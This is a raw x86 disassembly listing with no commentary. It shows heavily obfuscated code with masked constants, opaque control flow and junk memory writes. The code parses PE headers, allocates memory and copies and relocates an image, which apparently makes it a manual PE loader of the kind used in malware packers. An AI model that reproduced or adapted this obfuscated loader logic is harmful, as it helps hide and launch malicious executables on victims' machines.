  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
	...
